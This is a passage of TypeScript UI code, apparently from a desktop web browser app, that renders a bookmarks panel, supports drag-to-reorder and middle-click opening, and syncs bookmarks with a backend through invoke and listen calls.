        void closeBookmarksPanel();
      }
    });
    li.addEventListener("auxclick", (e) => {
      const me = e as MouseEvent;
      if (me.button === 1) {
        e.preventDefault();
        void tabNew(b.url);
      }
    });
    bookmarksListEl.appendChild(li);
  }
}

function startBookmarkPanelDrag(
  bmId: number,
  el: HTMLElement,
  downEvt: PointerEvent,
): void {
  if (downEvt.button !== 0) return;
  downEvt.preventDefault();
  const startX = downEvt.clientX;
  const startY = downEvt.clientY;
  let dragging = false;

  const findTarget = (y: number): { el: HTMLElement; index: number } | null => {
    if (!bookmarksListEl) return null;
    const items = Array.from(
      bookmarksListEl.querySelectorAll<HTMLElement>(".bookmark-item"),
    );
    let best: { el: HTMLElement; index: number } | null = null;
    let bestDist = Infinity;
    for (let i = 0; i < items.length; i++) {
      const r = items[i].getBoundingClientRect();
      const cy = r.top + r.height / 2;
      const d = Math.abs(y - cy);
      if (d < bestDist) {
        bestDist = d;
        best = { el: items[i], index: i };
      }
    }
    return best;
  };

  const setMarkers = (y: number) => {
    if (!bookmarksListEl) return;
    bookmarksListEl
      .querySelectorAll(".bookmark-item.drop-before, .bookmark-item.drop-after")
      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
    const t = findTarget(y);
    if (!t) return;
    const r = t.el.getBoundingClientRect();
    const before = y < r.top + r.height / 2;
    t.el.classList.add(before ? "drop-before" : "drop-after");
  };

  const onMove = (ev: PointerEvent) => {
    if (!dragging) {
      if (
        Math.abs(ev.clientX - startX) > 5 ||
        Math.abs(ev.clientY - startY) > 5
      ) {
        dragging = true;
        el.classList.add("dragging");
      } else {
        return;
      }
    }
    setMarkers(ev.clientY);
  };

  const cleanup = () => {
    window.removeEventListener("pointermove", onMove, true);
    window.removeEventListener("pointerup", onUp, true);
    window.removeEventListener("pointercancel", onCancel, true);
    bookmarksListEl
      ?.querySelectorAll(
        ".bookmark-item.drop-before, .bookmark-item.drop-after",
      )
      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
    el.classList.remove("dragging");
  };

  const onUp = (ev: PointerEvent) => {
    cleanup();
    if (!dragging) return;
    const t = findTarget(ev.clientY);
    if (!t) return;
    const r = t.el.getBoundingClientRect();
    const before = ev.clientY < r.top + r.height / 2;
    const fromIdx = bookmarks.findIndex((x) => x.id === bmId);
    if (fromIdx < 0) return;
    let to = before ? t.index : t.index + 1;
    if (fromIdx < to) to -= 1;
    if (to === fromIdx) return;
    void invoke("bookmarks_reorder", { id: bmId, toIndex: to }).catch((err) =>
      console.error("bookmarks_reorder failed:", err),
    );
  };

  const onCancel = () => {
    cleanup();
  };

  window.addEventListener("pointermove", onMove, true);
  window.addEventListener("pointerup", onUp, true);
  window.addEventListener("pointercancel", onCancel, true);
}

function renderBookmarks(): void {
  renderBookmarksBar();
  renderBookmarksPanel();
  updateBookmarkToggle();
}

async function openBookmarksPanel(): Promise<void> {
  if (!bookmarksPanel) return;
  try {
    await invoke("ui_set_expanded", { expanded: true });
  } catch (e) {
    console.error("ui_set_expanded failed:", e);
  }
  bookmarksPanel.hidden = false;
  bookmarksOpen = true;
  renderBookmarksPanel();
}

async function closeBookmarksPanel(): Promise<void> {
  if (!bookmarksPanel) return;
  bookmarksPanel.hidden = true;
  bookmarksOpen = false;
  try {
    await invoke("ui_set_expanded", { expanded: false });
  } catch (e) {
    console.error("ui_set_expanded failed:", e);
  }
}

async function setupBookmarks(): Promise<void> {
  bookmarksBarEl = document.getElementById(
    "bookmarks-bar-items",
  ) as HTMLDivElement | null;
  bookmarkToggleBtn = document.getElementById(
    "bookmark-toggle",
  ) as HTMLButtonElement | null;
  bookmarksPanel = document.getElementById(
    "bookmarks-panel",
  ) as HTMLDivElement | null;
  bookmarksListEl = document.getElementById(
    "bookmarks-list",
  ) as HTMLUListElement | null;
  bookmarksEmptyEl = document.getElementById(
    "bookmarks-empty",
  ) as HTMLDivElement | null;
  const openBtn = document.getElementById(
    "bookmarks-open",
  ) as HTMLButtonElement | null;
  const closeBtn = document.getElementById(
    "bookmarks-close",
  ) as HTMLButtonElement | null;

  bookmarkToggleBtn?.addEventListener("click", () => {
    void toggleBookmarkCurrent();
  });
  openBtn?.addEventListener("click", () => {
    void (bookmarksOpen ? closeBookmarksPanel() : openBookmarksPanel());
  });
  closeBtn?.addEventListener("click", () => void closeBookmarksPanel());

  void listen<BookmarkInfo[]>("bookmarks-updated", (event) => {
    bookmarks = event.payload || [];
    renderBookmarks();
  });

  try {
    bookmarks = await invoke<BookmarkInfo[]>("bookmarks_list");
  } catch (e) {
    console.error("bookmarks_list failed:", e);
    bookmarks = [];
  }
  renderBookmarks();
}
